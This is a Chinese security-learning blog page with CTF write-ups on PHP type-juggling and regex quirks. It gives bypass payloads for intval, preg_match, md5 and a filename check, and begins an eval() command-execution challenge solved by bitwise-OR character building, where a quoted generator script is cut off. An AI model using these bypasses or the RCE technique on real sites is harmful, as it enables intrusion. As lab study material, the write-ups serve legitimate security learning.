<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Traveler2000🪐</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="网络安全菜鸟，大佬们见笑了">
<meta property="og:type" content="website">
<meta property="og:title" content="Traveler2000🪐">
<meta property="og:url" content="http://traveler2000.github.io/index.html">
<meta property="og:site_name" content="Traveler2000🪐">
<meta property="og:description" content="网络安全菜鸟，大佬们见笑了">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Traveler2000">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Traveler2000🪐" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Traveler2000🪐</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://traveler2000.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-SERVER数组" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/" class="article-date">
  <time class="dt-published" datetime="2025-04-29T02:54:03.000Z" itemprop="datePublished">2025-04-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">SERVER数组</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/29/SERVER%E6%95%B0%E7%BB%84/" data-id="cma21qgo3000jxwuh3uysg67l" data-title="SERVER数组" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-PHP特性题目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" class="article-date">
  <time class="dt-published" datetime="2025-04-27T07:47:49.000Z" itemprop="datePublished">2025-04-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP特性题目</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP 特性题目</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<ul>
<li><p><code>preg_match()</code> 函数传入的参数只能是字符串，如果传入数组会报错，返回 <code>FALSE</code> 。</p>
</li>
<li><p><code>intval()</code> 函数将变量转换为整数类型。</p>
</li>
<li><p>当字符串是纯数字时，能正常转换为整数。</p>
</li>
<li><p>若字符串开头不是数字，转换结果为 0。</p>
</li>
<li><p>字符串开头为数字，会把开头的数字部分转换为整数，其他省略。</p>
</li>
<li><p>若 <code>intval()</code> 函数传入值为数组，当数组为空时返回 0 ，数组不为空时返回 1 。</p>
</li>
<li><p>构造 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure>

<p><strong>tips</strong>：在 URL 参数名后面加上 <code>[]</code> 来表明这是一个数组参数，每个数组元素作为一个单独的参数键值对，参数名相同，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1&amp;num[]=2&amp;num[]=3</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<ul>
<li><p><code>/^php$/im</code> ：按行匹配，不区分大小写，匹配是否有一行的内容完全对应 <code>php</code> 。</p>
</li>
<li><p><code>/^php$/i</code> ：不区分大小写，匹配整段字符串的内容是否为 <code>php</code> 。</p>
</li>
<li><p>注意：按行匹配是以换行符 <code>%0A</code> 为每行的结尾来区分每行、进行匹配的，也就是说下面这种情况只能算一行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=php%0A</span><br></pre></td></tr></table></figure>

<p>如果是下面这种情况就算两行，也就是本题 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0Aphp</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p>类似的题，只需要参考下列题目变换 Payload 即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<ul>
<li><p><code>===</code> 参考 JavaScript ，不仅数值要相等，数据类型也要相等。</p>
</li>
<li><p><code>intval($num,0)</code> ：当参数二为 <code>0</code> 时，表示根据字符串格式自动选择合适的进制来完成转换。</p>
</li>
<li><p>构造 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117C</span><br><span class="line">?num=010574   （0开头是八进制）</span><br><span class="line">?num=+4476</span><br><span class="line">?num=4476+1-1</span><br><span class="line">?num=4476.1</span><br><span class="line">?num=4476e1  （科学计数法）</span><br><span class="line">?num=4476&#x27;  （开头为数字时会把开头的数字部分转换为数字，其他忽略）</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="题目三变体一"><a href="#题目三变体一" class="headerlink" title="题目三变体一"></a>题目三变体一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p><code>==</code> 两边分别为字符串与数字时，会将字符串转换为数字再比较。<strong>转换过程没搞懂，暂时问不清楚！</strong></p>
<p>请看 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117C</span><br><span class="line">?num=010574</span><br><span class="line">?num=4476.1</span><br><span class="line">?num=4476e1</span><br></pre></td></tr></table></figure>



<h3 id="题目三变体二"><a href="#题目三变体二" class="headerlink" title="题目三变体二"></a>题目三变体二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p>又过滤了字母，还好前面总结的 Payload 够多。</p>
<p>请看 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=010574</span><br><span class="line">?num=4476.1</span><br></pre></td></tr></table></figure>



<h3 id="题目三变体三"><a href="#题目三变体三" class="headerlink" title="题目三变体三"></a>题目三变体三</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p>放宽了等于的条件，又加了一个条件，<code>strpos()</code> 返回某字符首次出现的位置，所以必须有 <code>0</code> 且 <code>0</code> 不能出现在首位。</p>
<p>请看 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574   （加了一个空格的八进制数值，核心是加符号还有0）</span><br><span class="line">?num=4476.0</span><br><span class="line">?num=4476+0</span><br></pre></td></tr></table></figure>



<h2 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br></pre></td></tr></table></figure>



<h2 id="题目五"><a href="#题目五" class="headerlink" title="题目五"></a>题目五</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>md5()</code> 函数传入非字符串类型参数时会返回 <code>false</code> ，此处可传入两个数组使 <code>md5()</code> 函数返回 <code>false</code> ，于是 <code>false === false</code> 绕过 MD5 校验成功。</p>
<h2 id="题目六"><a href="#题目六" class="headerlink" title="题目六"></a>题目六</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" data-id="cma21qgo00008xwuh6ouwcm4q" data-title="PHP 特性题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-利用或运算活字印刷" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" class="article-date">
  <time class="dt-published" datetime="2025-04-27T05:44:07.000Z" itemprop="datePublished">2025-04-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/">利用或运算活字印刷</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>本题过滤了大量字符，但留了 <code>|</code> 运算符未被过滤，则可通过<strong>按位或运算</strong>逐字得到我们要执行的命令。</p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p><code>|</code> 运算符指按位或运算，可将数值、字符等在二进制层面进行或运算：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span> | <span class="string">&quot;b&quot;</span>;</span><br><span class="line"><span class="comment"># 01100001 （字符 &quot;a&quot; 的 ASCII 码值 97 转换为二进制）</span></span><br><span class="line"><span class="comment"># 01100010 （字符 &quot;b&quot; 的 ASCII 码值 98 转换为二进制）</span></span><br><span class="line"><span class="comment"># 输出 c （ 01100011 ，字符 &quot;c&quot; 的 ASCII 码值 98 转换为二进制）</span></span><br></pre></td></tr></table></figure>

<p>了解了原理，看看大佬（[羽](<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41_ctfshow web41-CSDN博客</a>)）写的脚本吧：</p>
<p>脚本一（PHP）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;  <span class="comment"># 遍历 0 到 255 （有冗余，其实到 127 即可）</span></span><br><span class="line">	<span class="keyword">for</span> (<span 